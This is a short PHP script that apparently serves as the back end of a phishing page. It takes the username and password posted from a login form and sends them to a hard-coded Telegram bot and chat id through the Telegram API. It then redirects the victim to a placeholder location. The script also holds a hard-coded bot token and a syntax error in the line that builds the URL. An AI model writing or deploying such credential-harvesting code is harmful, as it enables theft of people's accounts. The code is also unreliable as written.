<?php
include 'ip.php';
$ur = "https://api.telegram.org/bot1250221734:AAET6dHwvjWTeC8DFvdeiRkTvB4feEBQ6yM/sendMessage?chat_id=744225167&parse_mode=Markdown&text=USERNAME=>". $_POST['username'] ."PASSWORD=>". $_POST['password'] . ; 
$ch = curl_init();
 
//Set the URL that you want to GET by using the CURLOPT_URL option.
curl_setopt($ch, CURLOPT_URL, $ur);
 
//Set CURLOPT_RETURNTRANSFER so that the content is returned as a variable.
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 
//Set CURLOPT_FOLLOWLOCATION to true to follow redirects.
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 
//Execute the request.
$data = curl_exec($ch);
 
//Close the cURL handle.
curl_close($ch);
 
//Print the data out onto the page.
echo $data;

                            
header('Location: <CUSTOM>');
exit();
